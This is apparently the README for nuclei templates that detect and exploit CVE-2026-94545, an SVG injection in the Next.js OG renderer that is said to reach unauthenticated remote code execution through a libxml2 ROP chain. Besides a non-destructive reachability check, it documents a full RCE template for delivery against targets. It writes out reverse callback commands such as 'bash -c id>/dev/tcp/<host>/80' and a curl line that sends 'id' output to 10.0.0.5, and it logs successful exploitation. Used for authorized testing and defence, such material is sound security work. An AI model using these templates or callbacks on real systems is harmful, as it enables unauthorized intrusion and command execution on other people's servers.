# CVE-2026-94545 — nuclei templates

Templates for **CVE-2026-94545**: Next.js `next/og` (ImageResponse → Satori) serializes
caller-controlled text without escaping (CWE-116). On the Node.js runtime with `sharp`
present, the resulting SVG is parsed by native libraries (libvips → librsvg → libxml2)
instead of the sandboxed `resvg-wasm` renderer, and an injected `xi:include` plus a nested
DTD entity corrupts memory inside libxml2. Because the current Node.js linux-x64 build is
non-PIE and ships fixed gadget addresses, a ROP chain assembled from qwords smuggled
through SVG path coordinates reaches `execve("/bin/sh", "-c", cmd)` — unauthenticated RCE,
no leak required.

| File | Purpose | Impact on target |
| --- | --- | --- |
| `CVE-2026-94545.yaml` | Reachability check: confirms the native XInclude path is live | none (non-destructive) |
| `CVE-2026-94545-rce.yaml` | Full exploit: builds and delivers the ROP payload, confirms out of band | executes `cmd` (worker process is replaced) |
| `lab/` | Reproducible localhost target: vulnerable build, patched twin, OOB listener, offline harness | — |

Both templates use the **JavaScript protocol** (nuclei v3): the payload is a computed binary
(IEEE-754 double encoding, ~1.2 KB SVG path), which is not expressible with static HTTP
requests. The JS builder inside the RCE template is byte-identical to the reference builder
shipped with the advisory.

## Affected / not affected

- Vulnerable: Next.js 16.2.0 – 16.3.5 on the Node.js runtime with `sharp` installed
  (Satori `>= 0.0.27 < 0.33.5`). Next 16.3.5 ships an OG renderer, built from
  `@vercel/og@0.11.1`, that passes text through un-escaped.
- Patched: Next.js 16.3.6 — same wrapper version, but its bundled renderer routes text
  through `escape-html`, so injected markup never reaches libxml2. Satori 0.33.5 upstream
  carries the equivalent fix.
- Not exploitable: Edge runtime, or a Node runtime without `sharp` (falls back to the
  sandboxed `resvg-wasm` renderer, which does not process XInclude).

## Usage

> **Both templates must be signed before nuclei will run them.**`javascript:` templates
> are refused when unsigned (see [Signing](#signing-is-required) below) — that is nuclei
> policy, not a template defect. `lab/run-nuclei.sh` does the signing and the runs for you.

```bash
# 0) once per machine, and again after every edit of a template file
nuclei -sign -t CVE-2026-94545.yaml       # on a fresh machine this only generates
nuclei -sign -t CVE-2026-94545.yaml       # the keypair; the second call writes the signature
nuclei -sign -t CVE-2026-94545-rce.yaml
nuclei -sign -t CVE-2026-94545-rce.yaml

# Reachability (safe, run this first)
nuclei -u https://target.example -t CVE-2026-94545.yaml

# Exploit with Interactsh (default callback: bash /dev/tcp/<interactsh host>/80)
nuclei -u https://target.example -t CVE-2026-94545-rce.yaml

# Exploit with an explicit command (<= 71 bytes) and no Interactsh
nuclei -u https://target.example -t CVE-2026-94545-rce.yaml -var cmd='curl http://10.0.0.5/x?i=$(id)'
```

### Signing is required

nuclei v3 skips unsigned `javascript:`-protocol templates outright, and an unsigned file is
therefore reported as `no templates provided for scan` even though the loader printed a
warning about it. The relevant code path is
`pkg/catalog/loader/loader.go`:

```go
// javascript-protocol templates expose Go-backed modules through
// the JS runtime, so unsigned ones are rejected before execution.
if parsed.IsUnsignedJavascriptTemplate() {
    stats.Increment(templates.SkippedUnverifiedJavascriptTemplateStats)
    ...
    return
}
```

The stats line is what you see as
`[WRN] Found 1 unsigned or tampered javascript template (carefully examine before using it & use -sign flag to sign them)`.
There is no flag that re-enables unsigned JS templates; `-code` is unrelated (it gates the
`code:` protocol only, `javascript:` requests are appended unconditionally in
`pkg/templates/compile.go`).

Signing workflow (`-sign`, ECDSA keypair in `~/.config/nuclei/keys/`, overridable with
`NUCLEI_USER_CERTIFICATE` / `NUCLEI_USER_PRIVATE_KEY`):

1. `nuclei -sign -t <file>` with no keys present **generates the keypair and exits** —
   run it a second time to actually sign. Key generation asks for a name and then twice
   for a passphrase; the input is hidden, a mismatch fails with
   `[FTL] passphrase did not match try again` and saves nothing, and **an empty passphrase
   (Enter twice) is allowed** — that stores the key unencrypted and stops nuclei asking
   again. Keys live in `~/.config/nuclei/keys/` or in `NUCLEI_USER_CERTIFICATE` /
   `NUCLEI_USER_PRIVATE_KEY`.
2. The signature is appended to the YAML as a `# digest: <sig>:<fragment>` line. Any later
   edit invalidates it and the template goes back to being "unsigned or tampered", so
   re-sign after every change.
3. The signature is bound to *your* keypair, so a signed copy only verifies on the machine
   that signed it. Do not commit signed templates; sign the copy you run
   (`lab/run-nuclei.sh` signs copies under `lab/.signed/`).

**Prompt-free keypair (recommended).** The interactive prompts are easy to fail — the
passphrase input is not echoed, and `[FTL] passphrase did not match try again` means the two
entries differed, nothing was written and you start over. Instead pre-create the pair in the
format the signer reads (SEC1 EC key + self-signed x509 cert), and `nuclei -sign` never asks
anything:

```bash
# keypair + signature in one prompt-free step (repeatable, idempotent)
./lab/make-signing-keys.sh --sign CVE-2026-94545.yaml

# or the individual steps
./lab/make-signing-keys.sh --check      # is a usable keypair present? creates nothing
./lab/make-signing-keys.sh              # writes ~/.config/nuclei/keys/{nuclei-user.crt,nuclei-user-private-key.pem}
nuclei -sign -t CVE-2026-94545.yaml     # single pass, no prompts
grep -n '^# digest:' CVE-2026-94545.yaml

# by hand, same result:
mkdir -p ~/.config/nuclei/keys && chmod 700 ~/.config/nuclei/keys
openssl ecparam -name prime256v1 -genkey -noout \
  -out ~/.config/nuclei/keys/nuclei-user-private-key.pem   # SEC1: "BEGIN EC PRIVATE KEY"
openssl req -new -x509 -key ~/.config/nuclei/keys/nuclei-user-private-key.pem \
  -subj "/CN=$USER" -days 1460 -sha256 -out ~/.config/nuclei/keys/nuclei-user.crt
```

Two format details, both required: the private key must be SEC1 (`openssl ecparam -genkey`,
*not* `openssl genpkey` which emits PKCS#8), and the certificate must carry a CN — nuclei
parses the key with `x509.ParseECPrivateKey` and rejects a cert without a common name. The
pair can also be supplied out-of-tree via `NUCLEI_USER_CERTIFICATE` /
`NUCLEI_USER_PRIVATE_KEY`. `lab/make-signing-keys.sh --help` lists its options, and
`lab/run-nuclei.sh` creates a keypair automatically when none is present.

### Variables

| Name | Template | Default | Notes |
| --- | --- | --- | --- |
| `base` | both | `{{Hostname}}` | Target base URL (`scheme://host[:port]`). Normally derived from the scan target; set `-var base=https://host:port` to override. |
| `ogpath` | both | `/api/og` | Path of the OG image route. Detection probes `POST <ogpath>` and `GET <ogpath>?value=` / `?text=` / `?title=`. |
| `safecheck` | rce | `true` | Pre-condition gate: sends the benign probe/control pair and aborts if the native path is absent. Set `-var safecheck=false` to force delivery. |
| `cmd` | rce | *(empty)* | Command to execute. Interactsh `bash -c 'id>/dev/tcp/<host>/80'` is used when empty. Hard limit of **71 bytes** (the ROP chain has to fit the overflow). |
| `oast` | rce | `{{interactsh-url}}` | Callback host, optionally `host:port` (port defaults to 80). Filled by Interactsh; set it explicitly for lab or live-fire testing. |

The JavaScript protocol does not expose `BaseURL`, so the base is built from `{{Hostname}}`
(`host[:port]`) and the scheme is resolved by probing — `http://` first, then `https://`,
and only one candidate when the base already carries a scheme or a port that identifies it
(`80`, `443`). A candidate that cannot answer a benign request is skipped.

## How the detection template decides

It injects the same `xi:include`/`data:` construct twice, byte-for-byte the same length:

- **probe** — the included document is a valid `feTurbulence` SVG, which the native parser
  resolves and rasterizes (≈ 2.5 MB PNG on the vulnerable stack).
- **control** — the first base64 character is flipped, so the included document is not valid
  XML and nothing is drawn (≈ 22 KB PNG).

A target is reported when `probe >= 200 KB`, `control < 200 KB` and `ratio >= 6` for at
least one request shape. Patched builds escape the text, and `resvg-wasm` ignores XInclude,
so both payloads render identically there and nothing is reported. The check never sends
the ROP payload, so it leaves a vulnerable target running.

Output carries the measurements, e.g.
`NEXTJS_OG_XINCLUDE_REACHABLE http://127.0.0.1:3000 POST /api/og probe=2522895B control=21979B ratio=114.8`,
matched by the `success == true` DSL matcher plus the `NEXTJS_OG_XINCLUDE_REACHABLE` word.

## Exploit behaviour

Execution is blind: the successful chain replaces the Node worker process, so the HTTP
request is aborted (connection reset / empty reply) and the result has to come back out of
band. A hit is an interaction on the Interactsh host — the default command runs
`id >/dev/tcp/<interactsh host>/80`, which yields both the DNS callback and the TCP payload.
`-var cmd=...` is available when the callback channel is already known and Interactsh is not
in use. The scheme is settled with a benign request before delivery, so an aborted payload
request is distinguishable from an unreachable target.

## Verification

Everything below was produced by `lab/run-tests.sh` against real builds, using the offline
harness in `lab/tools` (this sandbox cannot run the nuclei binary — see "Testing with real
nuclei" in `lab/README.md` for the same checks with the real tool).

| Check | Result |
| --- | --- |
| Stack under test | Next.js 16.3.5 / 16.3.6, Node v24.20.0 (non-PIE), libvips 8.18.6, librsvg 2.62.91, libxml2 2.15.3, sharp 0.35.4 |
| `CVE-2026-94545.yaml` → vulnerable 16.3.5 | **matched**: `probe=2522895B control=21979B ratio=114.8` |
| `CVE-2026-94545.yaml` → patched 16.3.6 | not matched (probe 22,954 B, ratio ≈ 1) |
| `CVE-2026-94545.yaml` → `-var base=http://127.0.0.1:3000` | matched (override path works) |
| `CVE-2026-94545.yaml` → closed port | not matched, no error |
| `CVE-2026-94545-rce.yaml` → patched 16.3.6, gate on | pre-condition false, payload never sent, target stays up |
| `CVE-2026-94545-rce.yaml` → patched 16.3.6, `safecheck=false` | payload delivered (HTTP 200), target survives, no callback |
| `CVE-2026-94545-rce.yaml` → vulnerable 16.3.5 | gate passes, 25,286-byte payload delivered (sha256 `cb55800f435d6522c82d73f0fa1b66c2dde2620617e29594a7787210c702401c`), request aborted, callback received `uid=1001(user) gid=1001(user) groups=1001(user),27(sudo),100(users)`, worker replaced |
| 72-byte command | refused with the 71-byte limit message, no request sent |
| Everything after a restart | target serves again, detection matches again |
| **Suite total** | **26 passed, 0 failed** |
| Manual scan, real nuclei v3.11.1 (signed template) against a containerised build | `[CVE-2026-94545-rce] [javascript] [critical] 127.0.0.1:3000` — 1 match, 8.8 s, interactsh callback |
| Lab app fidelity vs EQSTLab/CVE-2026-94545@main | `lab/check-upstream.sh`: dependencies, runtime pin, both request shapes and the `<title>` sink all identical |
| Templates vs the published app source (`lab/test-upstream-app.sh`) | 6/6: detection matches (probe 2,522,895 B, ratio 114.8), exploit delivers, callback `uid=1001(user)…`, process replaced |
| Template payload vs the advisory's `exploit.py` (`lab/compare-payload.sh`) | byte-identical for `id`, `bash -c 'id>/dev/tcp/127.0.0.1/4444'` and a 71-byte command |

Structural checks (`lab/tools/validate.mjs`): YAML parses, both templates validate against
`nuclei-jsonschema.json` (vendored from the nuclei repository), and every JS block passes a
syntax check. No `nuclei -validate` run was possible in this environment (no Go toolchain,
release downloads blocked), so the first run with the real binary is still worth doing —
`lab/run-nuclei.sh` handles the signing step that nuclei requires.

## Notes

- Reference: <https://github.com/EQSTLab/CVE-2026-94545>
- The gadget addresses are pinned to the official Node.js `v24.20.0` linux-x64 build. On a
  different Node build the corruption usually kills the worker without executing the
  command, so a missing callback means "not exploitable here", not necessarily "not
  vulnerable".
